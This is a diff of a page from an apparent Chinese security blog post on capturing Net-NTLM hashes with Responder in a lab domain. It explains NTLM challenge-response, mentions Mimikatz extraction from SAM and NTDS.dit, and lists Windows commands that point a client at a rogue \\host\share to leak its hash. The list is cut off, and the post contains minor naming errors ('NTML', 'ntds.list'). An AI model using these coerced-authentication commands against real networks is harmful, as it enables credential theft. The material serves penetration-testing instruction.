@@ -83,7 +83,7 @@
 <hr style="height:1px;border:none;border-top:1px dashed #0066CC;" />
 <article>
     <header>
-        <h2><a href="http://wyb0.com/posts/responder-and-ntml-hash/">内网渗透之Responder与NTML hash</a></h2>
+        <h2><a href="http://wyb0.com/posts/responder-and-ntml-hash/">内网渗透之Responder与Net-NTML hash</a></h2>
 
         
         <div class="post-meta">
@@ -126,12 +126,13 @@
  什么是NTLM Hash？
 早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash
  什么是Challenge-Response挑战/响应验证机制？
- Client输入username、password、domain，然后将密码hash后存在本地，并将username发送到Server DC生成一个16字节的随机数，即Challenge(挑战码)，然后传回Client Client收到Challenge后将密码hash和challenge混合hash，混合后的hash称为response，然后将challenge、response和username发送给Server Server将收到的3个值转发给DC，然后DC根据传过来的username到域控的账号数据库ntds.list找到对应的密码hash，将hash和Client传过来的challenge混合hash，将这个混合hash与Client传过来的response进行对比验证  关于Responder
+ Client输入username、password、domain，然后将用户名及密码hash后存在本地，并将username发送到Server DC生成一个16字节的随机数，即Challenge(挑战码)，然后传回Client Client收到Challenge后将密码hash和challenge混合hash，混合后的hash称为response，然后将challenge、response和username发送给Server Server将收到的3个值转发给DC，然后DC根据传过来的username到域控的账号数据库ntds.list找到对应的密码hash，将hash和Client传过来的challenge混合hash，将这个混合hash与Client传过来的response进行对比验证  NTLM Hash与Net-NTLM Hash
+ NTLM Hash通常是指Windows系统下Security Account Manager中保存的用户密码hash，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash（比如用Mimikatz提取），“挑战/响应验证”中的用户名及密码hash就是NTLM Hash Net-NTLM Hash通常是指网络环境下NTLM认证中的hash，“挑战/响应验证”中的response中包含Net-NTLM hash，用Responder抓取的就是Net-NTLM Hash  关于Responder
 由Laurent Gaffie撰写的 Responder 是迄今为止，在每个渗透测试人员用于窃取不同形式的证书（包括Net-NTLM hash）的最受欢迎的工具。它通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。Responder也有能力攻击LLMNR，NBT-NS和mDNS等协议。
  什么是NTLM中继攻击？
 攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。
-  0x01 软件环境  可以从https://github.com/lgandx/Responder下载Responder 域内主机：Win7（10.11.11.20） 域控主机：Win2008（10.11.11.18） 被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段  0x02 通过SMB服务获取NTLM hash 对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash
-net.exe use \\host\share attrib.exe \\host\share bcdboot.exe \\host\share bdeunlock.exe \\host\share cacls.exe \\host\share certreq.exe \\host\share #(noisy, pops an error dialog) certutil.exe \\host\share cipher.exe \\host\share ClipUp.
+  0x01 软件环境  可以从https://github.com/lgandx/Responder下载Responder 域内主机：Win7（10.11.11.20） 域控主机：Win2008（10.11.11.18） 被控主机：Ubuntu14.04（10.11.11.11）和目标机同一网段  0x02 通过SMB服务获取Net-NTLM hash 对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获hash，执行如下命令都可以得到hash
+net.exe use \\host\share attrib.exe \\host\share bcdboot.exe \\host\share bdeunlock.exe \\host\share cacls.
     </p>
 
     
